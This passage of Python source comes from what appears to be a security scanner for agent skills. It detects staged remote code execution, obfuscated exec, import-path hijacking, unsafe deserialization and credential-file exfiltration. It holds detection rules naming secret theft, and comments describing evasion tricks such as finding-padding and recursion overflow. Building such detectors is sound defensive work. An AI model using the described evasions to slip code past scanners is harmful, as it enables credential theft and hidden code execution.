                and node.func.value.id in syspath_aliases
            ):
                unknown = True  # a real mutation, but through an alias -- not trusted
            elif d in (
                "sys.meta_path.insert", "sys.meta_path.append",
                "sys.path_hooks.insert", "sys.path_hooks.append",
            ):
                unknown = True
        elif (
            isinstance(node, ast.AugAssign) and isinstance(node.op, ast.Add)
            and _b917_attr_path(node.target) == "sys.path"
        ):
            collect_elts(node.value, scope)
        elif (
            isinstance(node, ast.Assign) and len(node.targets) == 1
            and _b917_attr_path(node.targets[0]) == "sys.path"
        ):
            elts = None
            v = node.value
            if isinstance(v, ast.BinOp) and isinstance(v.op, ast.Add):
                for side in (v.left, v.right):
                    if isinstance(side, (ast.List, ast.Tuple)):
                        elts = side
                        break
            collect_elts(elts, scope)
        elif (
            isinstance(node, ast.Assign) and len(node.targets) == 1
            and isinstance(node.targets[0], ast.Subscript)
            and isinstance(node.targets[0].slice, ast.Slice)
            and _b917_attr_path(node.targets[0].value) == "sys.path"
        ):
            collect_elts(node.value, scope)
    return dirs, unknown


def _b917_file_flag(tree: ast.AST, facts, dotted_names: frozenset) -> bool:
    return any(
        isinstance(n, ast.Call) and facts.dotted(n.func) in dotted_names
        for n in ast.walk(tree)
    )


def _b917_import_sites(tree: ast.AST, facts):
    """[(node, resolved_candidates, suffix_candidates, is_wildcard)] for every
    import-like statement -- B-917 section C. A relative import resolves fully here
    (no sys.path involved); an absolute/dynamic one yields path SUFFIXES the caller
    joins with each member of the search set S."""
    sites: list = []
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.level:
            base = _shippedexec.Loc("FILE", facts.relparts[:-1])
            for _ in range(node.level - 1):
                nxt = base.up()
                base = nxt if nxt is not None else base
            resolved = []
            pkg = node.module.split(".") if node.module else []
            for alias in node.names:
                if alias.name == "*":
                    continue
                b2 = base
                for p in pkg:
                    b2 = b2.join(p)
                resolved.append(b2.join(alias.name + ".py"))
                resolved.append(b2.join(alias.name + "/__init__.py"))
            if pkg:
                b3 = base
                for p in pkg[:-1]:
                    b3 = b3.join(p)
                resolved.append(b3.join(pkg[-1] + ".py"))
                resolved.append(b3.join(pkg[-1] + "/__init__.py"))
            sites.append((node, resolved, [], False))
            continue
        if isinstance(node, ast.Import):
            suffixes = []
            for alias in node.names:
                parts = alias.name.split(".")
                for i in range(1, len(parts) + 1):
                    prefix = "/".join(parts[:i])
                    suffixes.append(prefix + ".py")
                    suffixes.append(prefix + "/__init__.py")
            sites.append((node, [], suffixes, False))
            continue
        if isinstance(node, ast.ImportFrom) and not node.level and node.module:
            parts = node.module.split(".")
            suffixes = []
            for i in range(1, len(parts) + 1):
                prefix = "/".join(parts[:i])
                suffixes.append(prefix + ".py")
                suffixes.append(prefix + "/__init__.py")
            for alias in node.names:
                if alias.name == "*":
                    continue
                sub = "/".join(parts + [alias.name])
                suffixes.append(sub + ".py")
                suffixes.append(sub + "/__init__.py")
            sites.append((node, [], suffixes, False))
            continue
        if isinstance(node, ast.Call):
            d = facts.dotted(node.func)
            is_dyn = d in _B917_MODULE_IMPORT_CALLS or (
                isinstance(node.func, ast.Name) and node.func.id == "__import__"
            )
            scope = facts.scope_of(node)
            if not is_dyn or not node.args or scope is None:
                continue
            lit = facts.literal(node.args[0], scope)
            if lit is None:
                sites.append((node, [], [], True))
                continue
            parts = lit.split(".")
            suffixes = []
            for i in range(1, len(parts) + 1):
                prefix = "/".join(parts[:i])
                suffixes.append(prefix + ".py")
                suffixes.append(prefix + "/__init__.py")
            sites.append((node, [], suffixes, False))
    return sites


def _b917_staged_import_findings(tree: ast.AST, facts, staged: list) -> list:
    """[(rule, severity, lineno, reason)] -- B-917 section C: correlate every
    import-like statement's search candidates against every tainted staged write in
    `staged`, by location equality (`shippedexec.loc_eq`)."""
    if not staged:
        return []
    search_dirs, unknown_dir = _b917_search_dirs(tree, facts)
    search_dirs = [_shippedexec.Loc("FILE", ())] + search_dirs
    has_chdir = _b917_file_flag(tree, facts, frozenset({"os.chdir", "os.fchdir"}))
    has_symlink = _b917_file_flag(tree, facts, frozenset({"os.symlink", "os.link"}))

    def compare(a, b) -> str:
        r = _shippedexec.loc_eq(a, b)
        if r == "DEFINITE_NOT" and (
            (has_chdir and (a.anchor == "CWD" or b.anchor == "CWD")) or has_symlink
        ):
            return "UNDETERMINED"
        return r

    out: list = []
    tainted_py_write = any(w_tainted and w_loc.leaf_py for _, w_loc, w_tainted in staged)
    for node, resolved, suffixes, is_wildcard in _b917_import_sites(tree, facts):
        ln = getattr(node, "lineno", 0)
        if is_wildcard:
            if tainted_py_write:
                out.append((
                    "STAGED_IMPORT_UNRESOLVED", "info", ln,
                    "a dynamic import whose module name is not a literal runs "
                    "alongside a remote/decoded write to a .py file elsewhere in "
                    "this file -- cannot confirm they are unrelated",
                ))
            continue
        candidates = list(resolved)
        for sfx in suffixes:
            for base in search_dirs:
                candidates.append(base.join(sfx))
        best = "DEFINITE_NOT"
        for _w_node, w_loc, w_tainted in staged:
            if not w_tainted:
                continue
            for c in candidates:
                r = compare(w_loc, c)
                if r == "DEFINITE":
                    best = "DEFINITE"
                    break
                if r == "UNDETERMINED" and best != "DEFINITE":
                    best = "UNDETERMINED"
            if best == "DEFINITE":
                break
        if best == "DEFINITE":
            out.append((
                "REMOTE_STAGED_IMPORT", "crit", ln,
                "content fetched/decoded and written to a path this file (or a "
                "sys.path entry it adds) then imports -- staged remote code "
                "execution via import",
            ))
        elif best == "UNDETERMINED":
            out.append((
                "STAGED_IMPORT_UNRESOLVED", "info", ln,
                "a remote/decoded write and this import's search path could not be "
                "proven to name the same file, nor proven to name different ones -- "
                "cannot confirm they are unrelated",
            ))
        elif unknown_dir and tainted_py_write:
            out.append((
                "STAGED_IMPORT_UNRESOLVED", "info", ln,
                "this file adds an unresolvable directory to sys.path (an aliased "
                "or computed member) while also writing remote/decoded content to "
                "a .py file -- cannot confirm they are unrelated",
            ))
    return out


# Artifact-wide staged-write cache (b917-design.md 2.3: "W is artifact-wide, cached
# once per artifact"), keyed on the `ShippedArtifact` INSTANCE via a WeakKeyDictionary
# so a write in one file of an artifact correlates with an import in another, an entry
# is computed once no matter how many files that artifact's scan visits, and it can
# never leak into a different artifact's verdict -- the key disappears with the
# artifact object itself (b917-design.md's own Risks section, section 6).
_B917_ARTIFACT_STAGED_CACHE: "weakref.WeakKeyDictionary" = weakref.WeakKeyDictionary()


def _b917_artifact_staged_writes(artifact) -> list:
    """[(node, Loc, tainted)] for every tainted staged write in ANY file of
    *artifact*, not just the one `_b917_findings` is currently analysing -- so the
    O3 shape split across two files (`updater.py` writes, `main.py` imports) is
    caught on `main.py`'s own pass. Each file's `Loc`s are already artifact-root
    relative (the same convention a single file's own `facts.locate()` uses), so no
    further re-basing is needed to compare across files. A sibling file that fails to
    parse contributes no write -- it gets its own AST_UNANALYZABLE finding when (if)
    it is itself scanned; that is a missed correlation, never a wrong one."""
    cached = _B917_ARTIFACT_STAGED_CACHE.get(artifact)
    if cached is not None:
        return cached
    out: list = []
    for rel, src in artifact.sources.items():
        try:
            sib_tree = ast.parse(src)
        except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError):
            continue
        sib_facts = _shippedexec._FileFacts(sib_tree, rel, artifact, set(), False)
        sib_remote_names = _b917_remote_tainted_names(sib_tree, sib_facts)
        out.extend(_b917_staged_writes(sib_tree, sib_facts, sib_remote_names))
    _B917_ARTIFACT_STAGED_CACHE[artifact] = out
    return out


def _b917_findings(tree: ast.AST, filename: str, artifact, facts=None) -> list:
    """[(rule, severity, lineno, reason)] for B-917: loader sinks
    (runpy/importlib/zipimport execute a FILE by PATH) and staged-import correlation
    (a write then an import resolving to the same location). See
    shippedexec.Loc/loc_eq and the design doc referenced by the B-917 Pulse task.

    `facts` (B-906): the caller's own `_FileFacts`/`PathFacts`, when it already built
    one (so `_RefResolver` and this can share a single reaching-definitions pass over
    the same file instead of computing it twice) -- built internally, exactly as
    before, when not supplied.
    """
    if facts is None:
        facts = (
            _shippedexec._FileFacts(tree, filename, artifact, set(), False)
            if artifact is not None
            else _shippedexec.PathFacts(tree, filename)
        )
    remote_names = _b917_remote_tainted_names(tree, facts)
    staged = _b917_staged_writes(tree, facts, remote_names)
    # Correlation set: this file alone with no artifact (nothing else to correlate
    # against); every file of the artifact, including this one, when there is one.
    correlated = staged if artifact is None else _b917_artifact_staged_writes(artifact)
    out: list = []

    for node in ast.walk(tree):
        hit = _b917_loader_call(node, facts)
        if hit is None:
            continue
        kind, path_node = hit
        scope = facts.scope_of(node)
        if scope is None:
            continue
        ln = getattr(node, "lineno", 0)
        loc = facts.locate(path_node, scope)
        # T1: this loader's target is DEFINITE-equal to a tainted staged write, in
        # this file or (with an artifact) any file of it.
        if any(
            w_tainted and _shippedexec.loc_eq(loc, w_loc) == "DEFINITE"
            for _, w_loc, w_tainted in correlated
        ):
            out.append((
                "REMOTE_STAGED_EXEC", "crit", ln,
                "content fetched from a remote URL or decoded is written to a path "
                f"and that path is then loaded through {kind} evaluation -- staged "
                "remote code execution",
            ))
            continue
        # T2: the loader's PATH argument itself carries remote/decode taint.
        if _b917_content_tainted(path_node, remote_names, facts):
            out.append((
                "DANGEROUS_LOADER", "crit", ln,
                f"a {kind} loader runs a path derived from remote or decoded data "
                "-- dynamic code execution from an untrusted location",
            ))
            continue
        # T3: a world-writable location (the temp dir, or a literal under it).
        if loc is not None and loc.writable:
            out.append((
                "DANGEROUS_LOADER", "crit", ln,
                f"a {kind} loader runs a file under a world-writable directory -- "
                "any local process can plant it there first",
            ))
            continue
        # T4: an artifact was given and the target sits inside it (FILE anchor).
        if loc is not None and loc.anchor == "FILE":
            if artifact is None:
                out.append(("DANGEROUS_SINK", "info", ln, f"a dynamic loader call ({kind})"))
                continue
            rel = "/".join(loc.parts) if loc.parts else ""
            cls = artifact.classify(rel) if rel else "present_unanalysed"
            if cls == "analysed":
                out.append(("DANGEROUS_SINK", "info", ln, f"a dynamic loader call ({kind})"))
            else:
                out.append((
                    "UNSHIPPED_FILE_EXEC", "info", ln,
                    f"a {kind} loader call runs {rel or '<unresolved>'}, a path "
                    "inside the skill that this scan did not analyse as Python (not "
                    "shipped, or not Python) -- whatever is there at runtime runs "
                    "as code",
                ))
            continue
        # T5: everything else -- an ext-taint-only selector (param/env/argv/input/
        # file-read/tool-result), CWD/HOME/other-ABS/SYM, or a FILE target this scan
        # cannot classify. A question, not a verdict (Golden Rule #4): a benign
        # `load_custom_strategy(path)` and a planted file read through the same
        # parameter are the identical AST.
        out.append((
            "LOADER_TARGET_UNVERIFIED", "info", ln,
            f"a {kind} loader call's target could not be verified as either the "
            "skill's own shipped code or a provably safe location -- the actual "
            "file run here is decided at runtime",
        ))

    out.extend(_b917_staged_import_findings(tree, facts, correlated))
    return out


def analyze_python(
    source: str,
    filename: str = "<skill>",
    own_host: str | None = None,
    artifact=None,
) -> list[ASTFinding]:
    """Return AST findings for one Python source string. Never raises, never executes.

    On a parse failure (SyntaxError, Python 2 syntax, pathological nesting, etc.)
    emits a single AST_UNANALYZABLE finding instead of returning an empty list, so
    callers can distinguish "clean file" from "file the AST/taint layer could not scan".

    `own_host` (C-223): the skill's own declared endpoint host (from its
    SKILL.md/manifest, computed by the caller — skillast.py has no access to that
    text itself), used to REWORD (not silence — self-declaration proves disclosed,
    not trustworthy) HOST_INFO_EXFIL_FLOW when a host-info value flows to the
    skill's OWN disclosed endpoint rather than an undeclared third party.

    `artifact` (B-638): a `shippedexec.ShippedArtifact` over every Python file the caller
    analyses for this artifact. With it, an exec/eval call proven to run exactly a file the
    artifact ships (resolved path containment, not a `__file__` token) is a plain
    DANGEROUS_SINK instead of OBFUSCATED_EXEC/TT5_CMD_INJECTION, and the older token-based
    carve-out below is NOT consulted -- it absolved reads whose path only mentioned
    `__file__`. Without it (a caller that cannot say what the artifact holds) behaviour is
    exactly what it was before.
    """
    try:
        tree = ast.parse(source)
        composing = _decode_composing_funcnames(tree)
        _toplevel_funcs = [
            n
            for n in getattr(tree, "body", [])
            if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
        ]
        _toplevel_classes = [
            n for n in getattr(tree, "body", []) if isinstance(n, ast.ClassDef)
        ]
        owner_map, parent_scope = _build_toplevel_owner_map(_toplevel_funcs, _toplevel_classes)
        shadow_cache: dict = {}
        tainted = _tainted_names(tree, composing, owner_map, parent_scope, shadow_cache)
        # B-132: precompute fixed-argv-list bindings once so the plain subprocess.*
        # DANGEROUS_SINK check below can tell a safe `subprocess.run(['prog', arg])`
        # (or `cmd = ['prog', arg]; subprocess.run(cmd)`) apart from a spliced/
        # interpolated command string — independent of taint (this is a shape check,
        # not a taint check; see _subprocess_call_is_fixed_argv).
        list_bindings_by_call = _list_bindings_by_call(tree)
        # B-422 follow-up: names bound to a networking-library session/client/socket
        # constructor (e.g. `s = requests.Session()`), so _is_net_sink recognizes
        # `s.put(...)` the same as a literal `session.put(...)` — see _net_sink_alias_names.
        net_sink_aliases = _net_sink_alias_names(tree)
        # B-855: computed once per file rather than re-walking `tree` at every
        # qualifying exec/taint-sink site below — same result, `tree` does not change
        # within this call.
        path_aliases = _path_module_aliases(tree)
        # B-638: (lineno, col_offset) of exec/eval calls proven to run a shipped file, and
        # of those whose only gap is that the in-artifact file they run is not shipped.
        shipped_exec = (
            artifact.exact_exec_sites(filename, source) if artifact is not None else None
        )
        unshipped_exec = (
            artifact.unshipped_exec_sites(filename, source) if artifact is not None else {}
        )
        # B-906: one `_FileFacts`/`PathFacts` pass, shared with `_b917_findings` below
        # (never computed twice) and handed to `_RefResolver` for the TT5 positive-
        # resolution rules further down -- see `_RefResolver`'s own module note.
        facts = (
            _shippedexec._FileFacts(tree, filename, artifact, set(), False)
            if artifact is not None
            else _shippedexec.PathFacts(tree, filename)
        )
        ref_res = _RefResolver(tree, facts)
    except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError) as exc:
        err_type = type(exc).__name__
        return [
            ASTFinding(
                "AST_UNANALYZABLE",
                "unknown",
                0,
                f"could not parse {filename} ({err_type}) — file not analyzed by the AST/taint layer",
            )
        ]

    out: list[ASTFinding] = []
    seen: set[tuple[str, int]] = set()

    def add(rule: str, severity: str, lineno: int, reason: str) -> None:
        key = (rule, lineno)
        if key in seen:
            return
        seen.add(key)
        out.append(ASTFinding(rule, severity, lineno, reason))

    # B-907 round 1 gated this loop (and every other one below) on a shared, global
    # `len(out) >= _MAX_FINDINGS_PER_FILE` — an earlier pass filling `out` with
    # low-severity noise made every LATER pass's loop break on its first iteration,
    # silently dropping a real crit (TT5_CMD_INJECTION) that pass would otherwise have
    # found. Round 2 gave each pass its own `_MAX_FINDINGS_PER_FILE`-sized budget,
    # which reintroduced the identical starvation WITHIN this one pass, since it is
    # not single-severity: it also emits HARDCODED_PROVIDER_SECRET / OBFUSCATED_EXEC /
    # GETATTR_INDIRECTION / DYNAMIC_IMPORT_EXEC (all crit-capable) inline, in the same
    # walk, alongside plain DANGEROUS_SINK (info) — 25 padding DANGEROUS_SINK matches
    # early in this loop still filled that budget and broke before a later node's crit
    # was ever reached. Round 2's fix of raising the ceiling to 20x only raised the
    # padding count an attacker needs, so round 3 removes the per-pass ceiling
    # entirely (see the module-level comment above `_MAX_FINDINGS_PER_FILE`): this
    # loop now runs to completion over every node, and the final severity-ordered
    # truncation at `return` below is the sole place `_MAX_FINDINGS_PER_FILE` is
    # enforced, so a real crit can never be starved out by a lower-severity finding —
    # from an earlier pass, or from earlier in this same pass.
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        f = node.func
        ln = getattr(node, "lineno", 0)

        # B-140(b): os.getenv("KEY", "<provider-shaped-literal>") / os.environ.get("KEY", "<...>")
        # — a hardcoded provider-shaped secret used as the literal fallback/default arg.
        if isinstance(f, ast.Attribute) and len(node.args) >= 2:
            is_os_getenv = f.attr == "getenv" and _attr_base(f.value) == "os"
            is_environ_get = f.attr == "get" and (
                (
                    isinstance(f.value, ast.Attribute)
                    and f.value.attr == "environ"
                    and _attr_base(f.value.value) == "os"
                )
                or (isinstance(f.value, ast.Name) and f.value.id == "environ")
            )
            if is_os_getenv or is_environ_get:
                default_arg = node.args[1]
                if _is_hardcoded_provider_secret(default_arg):
                    key_node = node.args[0]
                    key_repr = (
                        key_node.value
                        if isinstance(key_node, ast.Constant) and isinstance(key_node.value, str)
                        else "<dynamic>"
                    )
                    call_name = "os.getenv" if is_os_getenv else f"{_attr_base(f.value)}.get"
                    add(
                        "HARDCODED_PROVIDER_SECRET",
                        "crit",
                        ln,
                        f"hardcoded provider-shaped secret as the default arg of "
                        f"{call_name}({key_repr!r}, ...)",
                    )
                continue

        # A call to a dynamic-evaluation builtin (the names in _EXEC_NAMES):
        # an obfuscated/decoded or tainted argument = crit; a plain one = info.
        if isinstance(f, ast.Name) and f.id in _EXEC_NAMES and node.args:
            arg = node.args[0]
            visible_composing = _decode_composing_visible(
                node, composing, owner_map, parent_scope, shadow_cache
            )
            visible_tainted = _tainted_names_visible(
                node, tainted, owner_map, parent_scope, shadow_cache
            )
            has_decode_signal = _subtree_has_decode(arg)
            # B-638: the executed value is exactly a file this artifact ships -- proven by
            # shippedexec against the artifact's own file set. Nothing is decoded, hidden
            # or tainted in it, so it is the plain dynamic call it looks like.
            if shipped_exec is not None and (ln, node.col_offset) in shipped_exec:
                add("DANGEROUS_SINK", "info", ln, f"a dynamic {f.id} call")
                continue
            # B-638: the same proof holds except the file is not one this scan analysed --
            # it is missing, or not Python. Its content is unknown, which is not evidence of
            # a payload either: a WARN-grade question, never a crit (Golden Rule #4).
            if (ln, node.col_offset) in unshipped_exec:
                add(
                    "UNSHIPPED_FILE_EXEC",
                    "info",
                    ln,
                    f"a call to {f.id} runs {unshipped_exec[(ln, node.col_offset)]}, a path "
                    "inside the skill that this scan did not analyse as Python (not shipped, "
                    "or not Python) — whatever is there at runtime runs as code",
                )
                continue
            # B-640/B-850: `.decode("utf-8")` reading a __file__-relative sibling file
            # (the canonical setup.py idiom -- see the "B-850: artifact-containment
            # ALLOWLIST recognizer" module comment above) is not obfuscation on its
            # own. Only un-arms the bare-decode signal; a real content-hiding primitive
            # elsewhere in the same expression still convicts. `tree`, not a best-guess
            # enclosing scope: the recognizer finds each node's own lexical scope
            # itself from the whole-module parent-pointer map it builds. B-638: a
            # recognizer, not the precise ShippedArtifact proof, so it is only
            # consulted when the caller could not supply the artifact -- a caller that
            # can (check_installed_skills, vet_plugin, vet_skill) gets NO heuristic
            # exemption for anything shippedexec itself could not resolve; that
            # stricter no-exemption-with-known-artifact policy is B-638's own, measured
            # against `test_b638_shipped_exec_containment.py`'s ESCAPES cases
            # (`env_segment_inline`, `lossy_decode`) and its
            # test_plugin_env_joined_path_fails/test_bad_fixture_env_joined_path_fails
            # -- all five broke when this gate was briefly dropped during the B-850
            # merge, confirming it is deliberate, adversarially-reviewed behavior, not
            # an oversight the recognizer should override.
            if shipped_exec is None and has_decode_signal and _decode_signal_is_only_artifact_relative_reads(
                arg, tree, filename, path_aliases
            ):
                has_decode_signal = False
                # B394: an UNPROVEN read (anchored, but a segment is runtime-computed)
                # is never FAIL-capable -- see checks/_vet.py's ARTIFACT_READ_UNPROVEN
                # bucket -- but is disclosed rather than silently absolved like BOUNDED.
                for _up_ln, _up_reason in _containment_unproven_decode_findings(
                    arg, tree, filename, path_aliases
                ):
                    add("ARTIFACT_READ_UNPROVEN", "info", _up_ln, _up_reason)
            if (
                has_decode_signal
                or (_names_in(arg) & visible_tainted)
                or _subtree_calls_decode_composing(arg, visible_composing)
            ):
                add(
                    "OBFUSCATED_EXEC",
                    "crit",
                    ln,
                    f"a call to {f.id} on a decoded/obfuscated string (hidden payload execution)",
                )
            else:
                add("DANGEROUS_SINK", "info", ln, f"a dynamic {f.id} call")
            continue

        # getattr(obj, name)(...) — obfuscated call.
        # B-639: crit REQUIRES the base object resolve to a known-dangerous module
        # (os/subprocess/...) -- for BOTH a dangerous attribute literal and a dynamic
        # attr. A dangerous-shaped attribute NAME alone ("run"/"call" -- also real
        # subprocess.run/call names) on an ordinary object is normal dynamic dispatch
        # (a plugin registry's `getattr(handler, "run")()`) -> never flagged, matching
        # the sibling "dynamic attr on an ordinary object" case just below it. Before
        # this fix the literal branch matched on the attribute name alone, with no
        # base-object check at all -- unlike the dynamic branch, which already required
        # `base_obj in _DANGEROUS_OBJ` -- so `getattr(handler, "run")(x)` in a plugin
        # dispatcher FAILed identically to `getattr(os, "system")(x)`.
        if isinstance(f, ast.Call) and isinstance(f.func, ast.Name) and f.func.id == "getattr":
            first = f.args[0] if f.args else None
            second = f.args[1] if len(f.args) >= 2 else None
            literal_str = isinstance(second, ast.Constant) and isinstance(second.value, str)
            dynamic = second is not None and not literal_str
            base_obj = _attr_base(first) if first is not None else ""
            dangerous_obj = base_obj in _DANGEROUS_OBJ
            dangerous_literal = literal_str and second.value in _DANGEROUS_ATTRS and dangerous_obj
            if dangerous_literal or (dynamic and dangerous_obj):
                add(
                    "GETATTR_INDIRECTION",
                    "crit",
                    ln,
                    "getattr(...)() indirection to a dangerous attribute (obfuscated call)",
                )
            elif dynamic:
                add("GETATTR_INDIRECTION", "info", ln, "dynamic getattr(...)() dispatch")
            continue

        # __import__("os").system(...) / importlib.import_module("os").system(...)
        # B-639: the SAME defect as the getattr rule above, on the module-name side --
        # crit REQUIRES the imported module to be a literal that resolves to a
        # known-dangerous module. Before this fix the code never inspected the
        # __import__/import_module argument at all: ANY dynamically-imported module
        # combined with a dangerous-shaped attribute name FAILed, so
        # `importlib.import_module(plugin_name).run(x)` (a dynamic plugin loader) or
        # `importlib.import_module("a.b").run(1)` (an ordinary, non-dangerous target)
        # convicted identically to `importlib.import_module("os").system(x)`. A
        # computed/unresolvable module name is the same ambiguity as getattr's dynamic
        # branch -- downgraded to info (still visible, escalates only alongside a
        # cred/exfil signal), not silenced.
        if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Call):
            inner = f.value.func
            is_dyn_import = (isinstance(inner, ast.Name) and inner.id == "__import__") or (
                isinstance(inner, ast.Attribute) and inner.attr == "import_module"
            )
            if is_dyn_import and f.attr in _DANGEROUS_ATTRS:
                mod_arg = f.value.args[0] if f.value.args else None
                mod_literal = (
                    mod_arg.value
                    if isinstance(mod_arg, ast.Constant) and isinstance(mod_arg.value, str)
                    else None
                )
                mod_base = mod_literal.split(".")[0].lower() if mod_literal else None
                if mod_base in _DANGEROUS_OBJ:
                    add(
                        "DYNAMIC_IMPORT_EXEC",
                        "crit",
                        ln,
                        f"__import__(...).{f.attr}() — dynamic import to evade static scan",
                    )
                else:
                    reason_target = (
                        f"a non-dangerous module ({mod_literal!r})"
                        if mod_literal is not None
                        else "a computed/unresolvable module name"
                    )
                    add(
                        "DYNAMIC_IMPORT_EXEC",
                        "info",
                        ln,
                        f"__import__(...).{f.attr}() — dynamic import to {reason_target}",
                    )
                continue

        # D1 (defensibility): sys.path.insert/append to a relative / writable / env-derived
        # location — an import-path hijack surface. Anyone who can write that path drops a
        # module the skill then imports. The benign self-dir form (dirname(__file__)) is clean.
        _sp_arg = _is_sys_path_mutation(node)
        if _sp_arg is not None:
            if _is_writable_import_path(_sp_arg):
                add(
                    "IMPORT_FROM_WRITABLE",
                    "info",
                    ln,
                    "sys.path is extended with a relative / writable / env-derived location — "
                    "anyone able to write that path can hijack the skill's imports",
                )
            continue

        # pickle/marshal/dill/torch.loads/load(...) — info (code-exec only if data untrusted).
        # yaml.load(...) is a special case (F-098/L1-1): unsafe unless an explicit safe
        # Loader= kwarg is given; yaml.safe_load has a different attr name and never reaches
        # here at all, so it stays clean without any special-casing.
        if isinstance(f, ast.Attribute) and f.attr in ("loads", "load"):
            mod = _attr_base(f.value)
            if mod == "yaml" and f.attr == "load":
                loader_kw = next((kw for kw in node.keywords if kw.arg == "Loader"), None)
                loader_name = (
                    loader_kw.value.attr
                    if loader_kw is not None and isinstance(loader_kw.value, ast.Attribute)
                    else (
                        loader_kw.value.id
                        if loader_kw is not None and isinstance(loader_kw.value, ast.Name)
                        else None
                    )
                )
                if loader_name not in _YAML_SAFE_LOADERS:
                    add(
                        "DESERIALIZE_CODE",
                        "info",
                        ln,
                        "yaml.load() without a safe Loader (SafeLoader/BaseLoader) — "
                        "arbitrary-code-execution risk if the data is untrusted",
                    )
                continue
            # B-132: torch.load(..., weights_only=True) is PyTorch's own safe-loading
            # flag (analogous to yaml's SafeLoader) — it restricts unpickling to a fixed
            # allowlist of tensor/primitive types, so it is not a code-exec-on-load risk
            # the way a bare torch.load()/pickle.load() is. Skip flagging it entirely,
            # mirroring the yaml.load(Loader=SafeLoader) special-case above.
            if mod == "torch" and f.attr == "load":
                wo_kw = next((kw for kw in node.keywords if kw.arg == "weights_only"), None)
                if (
                    wo_kw is not None
                    and isinstance(wo_kw.value, ast.Constant)
                    and wo_kw.value.value is True
                ):
                    continue
            if mod in _DESERIALIZE_MODS:
                add(
                    "DESERIALIZE_CODE",
                    "info",
                    ln,
                    f"{mod}.{f.attr}() deserialization (code-exec risk if data is untrusted)",
                )
                continue

        # os.system/popen/exec*/spawn*, subprocess.* — info shell/exec sinks
        if isinstance(f, ast.Attribute):
            base = _attr_base(f.value)
            is_os = base == "os" and (
                f.attr in ("system", "popen")
                or f.attr.startswith("ex" + "ec")
                or f.attr.startswith("spawn")
            )
            is_subp = base == "subprocess" and f.attr in (
                "run",
                "call",
                "check_output",
                "check_call",
                "Popen",
            )
            # B-132: a subprocess.* call with a literal, fixed argv list (shell not True)
            # passes its arguments straight to execve — not through a shell — so it is
            # far lower risk than a spliced/interpolated command string and should not
            # weigh the same as a genuine shell-exec sink. Skip flagging it entirely here
            # (it still participates fully in the separate taint-aware TT5 pass below,
            # which already distinguishes command- from argument-injection).
            if is_subp and _subprocess_call_is_fixed_argv(node, list_bindings_by_call.get(node)):
                continue
            if is_os or is_subp:
                add("DANGEROUS_SINK", "info", ln, f"{base}.{f.attr}() shell/exec sink")
                continue

    # Taint: credential-FILE contents reaching a network sink (read secret -> send out).
    # Cheap pre-filter on the raw source so the propagation runs only when relevant --
    # widened by B-830 with a root-independent fold (see the Gate V/S/A block above
    # _has_cred_path_const) so a credential path assembled via typed path-join
    # construction (never spelled as one literal) still pre-filters in.
    #
    # B-830 round-3 (C-135): the fold algebra (_fold_fs_path/_fold_seg) now bounds its
    # own recursion with an explicit depth counter (_FOLD_MAX_DEPTH, see its module
    # comment) instead of relying on a try/except RecursionError here. A prior round's
    # except-RecursionError fallback (ctx=None, literal-only credential detection) was
    # itself a silent, undisclosed whole-file bypass: an attacker could deliberately
    # overflow the fold with an unrelated long chain ANYWHERE else in the file (e.g. a
    # padding arithmetic expression) and have that disable credential-path folding for
    # every OTHER, genuinely malicious path-join elsewhere in the same file, with no
    # UNKNOWN/degraded-engine disclosure -- strictly worse than a loud crash. With
    # recursion now bounded inside the fold itself, an unhandled RecursionError from
    # this call would indicate a genuinely unexpected condition and should propagate.
    _fsctx = _FsFoldCtx(tree)
    _folded_cred_hit = _has_folded_cred_path(tree, _fsctx)
    if _CRED_PATH_RE.search(source) or _folded_cred_hit:
        cred_tainted = _cred_tainted_names(tree, _fsctx)
        if cred_tainted:
            # B-415: names sourced PURELY from the in-cluster K8s service-account
            # token -- computed once per file, only when there's anything credential-
            # tainted at all, since both helpers re-walk the whole tree.
            incluster_pure = _incluster_pure_tainted_names(tree, _fsctx)
            str_map = _simple_str_const_assigns(tree) if incluster_pure else {}
            for node in ast.walk(tree):
                if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
                    continue
                hit_names = _names_in(node) & cred_tainted
                if not hit_names:
                    continue
                # Exemption applies ONLY when every hit name is in-cluster-pure (never
                # a name also/ever sourced from .ssh/.aws/a generic secrets mount) AND
                # the position+destination checks in _is_incluster_auth_exempt hold.
                if hit_names <= incluster_pure and _is_incluster_auth_exempt(
                    node, hit_names, str_map
                ):
                    continue
                add(
                    "CRED_EXFIL_FLOW",
                    "crit",
                    getattr(node, "lineno", 0),
                    "credential-file contents flow into a network sink (read secret -> send out)",
                )

    # B-830 round-4: ctx.truncated (see _FsFoldCtx.__init__) counts how many fold calls
    # hit _FOLD_MAX_DEPTH and gave up on their own subtree -- round-3 added the counter
    # but left it write-only (observability that nobody observed), which is exactly the
    # "silent, undisclosed... never a fake PASS/FAIL, report UNKNOWN instead" gap this
    # module's own doctrine forbids elsewhere. Disclosed here in the same SHAPE
    # AST_UNANALYZABLE uses (per-file ASTFinding, severity "unknown", lineno 0) but
    # under its own rule id -- deliberately NOT folded into AST_UNANALYZABLE itself:
    # that rule means "parse failed, nothing in this file was analyzed" and several
    # callers (checks/_content.py, checks/_vet.py, checks/_lifecycle.py,
    # checks/_mcp.py) key on that exact string to route a file to their "unreadable"
    # bucket. A fold truncation means the opposite -- the file parsed and was analyzed,
    # only one or more deeply-nested path/value expressions exceeded the recursion cap
    # -- so reusing AST_UNANALYZABLE would misrepresent a mostly-covered file as
    # entirely unreadable to every one of those consumers.
    if _fsctx.truncated:
        add(
            "AST_FOLD_TRUNCATED",
            "unknown",
            0,
            f"{filename}: {_fsctx.truncated} path/value fold(s) in this file exceeded "
            "the recursion depth cap and were left unresolved -- coverage of deeply-"
            "nested path construction is incomplete for this file",
        )

    # F-049: env-var / agent-config secret reaching a network sink (SkillSpector E2 env
    # harvesting + E1 external transmission).  Severity is "info" and the checks engine routes it
    # to a WARN — never an automatic FAIL — because legit skills DO post an env secret to a
    # trusted endpoint (e.g. ANTHROPIC_API_KEY -> api.anthropic.com) and the scanner cannot
    # know the destination.  The taint must actually connect: a name assigned from an
    # env/config read appears in the sink's args, OR an env read is inline in the args.  An
    # env read that feeds a local sink, or an unrelated network call, never fires.
